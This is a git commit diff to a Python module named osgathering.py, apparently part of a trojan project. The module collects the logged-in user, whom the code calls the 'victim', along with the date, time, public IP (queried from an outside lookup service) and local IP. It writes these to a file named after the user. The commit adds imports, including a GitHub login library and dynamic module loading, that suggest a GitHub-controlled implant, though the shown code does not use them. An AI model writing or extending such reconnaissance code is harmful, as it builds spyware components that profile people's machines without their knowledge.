088c43854c82aa573b9b36ea282407b6ca073f58
L0uizZ <louis.hinz@hotmail.de>
2016-12-18 20:54:16 +0100

    Adding module.

--- modules/osgathering.py
+++ modules/osgathering.py
@@ -3,7 +3,17 @@ import socket
 from urllib2 import urlopen
 import time
 import getpass
+import json
+import base64
+import sys
+import time
+import imp
+import random
+import threading
+import Queue
+import os
 
+from github3 import login
 
 victim = str(getpass.getuser())
 
@@ -11,10 +21,15 @@ f1=open(victim, 'w+')
 
 print (time.strftime("%H:%M:%S"))
 f1.write("Time: %s\n" % time.strftime("%H:%M:%S"))
+
+
 print (time.strftime("%d/%m/%Y"))
 f1.write("Date: %s\n" % time.strftime("%d/%m/%Y"))
-print getpass.getuser()
-f1.write("User: %s\n" % getpass.getuser())
+
+
+print victim
+f1.write("User: %s\n" % victim)
+
 
 my_ip = urlopen('http://ip.42.pl/raw').read()
 	
@@ -45,7 +60,10 @@ elif sys.platform.startswith('atheos'):
 
 print "IPv4 Public: %s" % my_ip
 f1.write("Public IPv4: %s\n" % my_ip)
+
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
 print "IPv4 Local: %s" % s.getsockname()[0]
-f1.write("Local IPv4: %s\n" % s.getsockname()[0])
+f1.write("Local IPv4: %s" % s.getsockname()[0])
+f1.close()
+
